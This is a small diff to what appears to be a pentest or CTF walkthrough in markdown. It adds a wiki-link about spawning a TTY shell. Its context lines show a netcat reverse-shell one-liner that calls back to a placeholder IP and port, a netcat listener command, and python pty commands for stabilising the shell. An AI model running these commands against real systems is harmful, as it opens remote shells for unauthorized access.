@@ -87,7 +87,7 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <your-ip> <your-port> > /
 ```
 Also setup a NC listener `nc -nlvp 4444`
 
-To stabilize the shell and make it interactive, I **ran**
+To [[Spawning a TTY shell]] stabilize the shell and make it interactive, I **ran**
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
